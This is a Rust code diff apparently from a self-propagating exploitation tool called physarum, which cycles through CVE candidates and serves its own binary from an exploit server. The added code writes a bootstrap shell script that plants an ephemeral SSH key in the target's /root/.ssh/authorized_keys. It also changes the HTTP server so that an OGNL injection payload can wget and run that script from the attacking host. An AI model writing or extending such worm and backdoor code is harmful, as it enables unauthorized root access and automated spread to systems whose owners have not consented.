@@ -162,6 +162,11 @@ pub async fn run(
         match generate_ephemeral_keypair().await {
             Ok(k) => {
                 tracing::info!(%target, pubkey = %k.pubkey, "ephemeral SSH keypair generated");
+                // Write bootstrap.sh so the binary server can serve it at /bootstrap.sh.
+                // The OGNL payload only needs to wget this URL — no pubkey or complex shell in the URL.
+                if let Err(e) = write_bootstrap_script(&k.pubkey).await {
+                    tracing::warn!(%target, err = %e, "bootstrap script write failed — wget pubkey path unavailable");
+                }
                 Some(k)
             }
             Err(e) => {
@@ -1530,6 +1535,25 @@ pub(crate) async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey>
     })
 }
 
+/// Write `/tmp/physarum/bootstrap.sh` — a shell script that plants the ephemeral pubkey
+/// into `/root/.ssh/authorized_keys` and creates `/tmp/physarum` on the target.
+///
+/// The OGNL payload only needs to `wget` this script and run `sh /tmp/bootstrap.sh`,
+/// keeping the OGNL path short and free of pubkey content or `&&` chains.
+async fn write_bootstrap_script(pubkey: &str) -> anyhow::Result<PathBuf> {
+    use std::os::unix::fs::PermissionsExt;
+    let path = PathBuf::from("/tmp/physarum/bootstrap.sh");
+    // printf '%s\n' is safer than echo: handles keys with dashes/spaces without shell expansion.
+    let content = format!(
+        "#!/bin/sh\nmkdir -p /root/.ssh\nchmod 700 /root/.ssh\nprintf '%s\\n' '{}' >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nmkdir -p /tmp/physarum\n",
+        pubkey
+    );
+    tokio::fs::write(&path, &content).await?;
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;
+    tracing::debug!(path = %path.display(), "bootstrap.sh written");
+    Ok(path)
+}
+
 // ── Propagation candidate ranking ────────────────────────────────────────────
 
 /// Maximum number of ranked CVE candidates cycled through the attempt loop.
@@ -1677,22 +1701,45 @@ async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHand
             let binary_path = binary_path.clone();
             tokio::spawn(async move {
                 let mut buf = [0u8; 512];
-                let _ = socket.read(&mut buf).await;
-                match tokio::fs::read(&binary_path).await {
-                    Ok(data) => {
-                        let header = format!(
-                            "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
-                            data.len()
-                        );
-                        let _ = socket.write_all(header.as_bytes()).await;
-                        let _ = socket.write_all(&data).await;
-                        tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
+                let n = socket.read(&mut buf).await.unwrap_or(0);
+                let request = std::str::from_utf8(&buf[..n]).unwrap_or("");
+                // Parse the request path from the first line: "GET /path HTTP/1.x"
+                let path = request.split_whitespace().nth(1).unwrap_or("/physarum-maze");
+
+                if path == "/bootstrap.sh" {
+                    let script_path = PathBuf::from("/tmp/physarum/bootstrap.sh");
+                    match tokio::fs::read(&script_path).await {
+                        Ok(data) => {
+                            let header = format!(
+                                "HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n",
+                                data.len()
+                            );
+                            let _ = socket.write_all(header.as_bytes()).await;
+                            let _ = socket.write_all(&data).await;
+                            tracing::debug!(%peer, bytes = data.len(), "bootstrap.sh served");
+                        }
+                        Err(e) => {
+                            tracing::warn!(%peer, err = %e, "bootstrap.sh not found — was write_bootstrap_script called?");
+                            let _ = socket.write_all(b"HTTP/1.0 404 Not Found\r\n\r\n").await;
+                        }
                     }
-                    Err(e) => {
-                        tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
-                        let _ = socket
-                            .write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n")
-                            .await;
+                } else {
+                    match tokio::fs::read(&binary_path).await {
+                        Ok(data) => {
+                            let header = format!(
+                                "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
+                                data.len()
+                            );
+                            let _ = socket.write_all(header.as_bytes()).await;
+                            let _ = socket.write_all(&data).await;
+                            tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
+                        }
+                        Err(e) => {
+                            tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
+                            let _ = socket
+                                .write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n")
+                                .await;
+                        }
                     }
                 }
             });
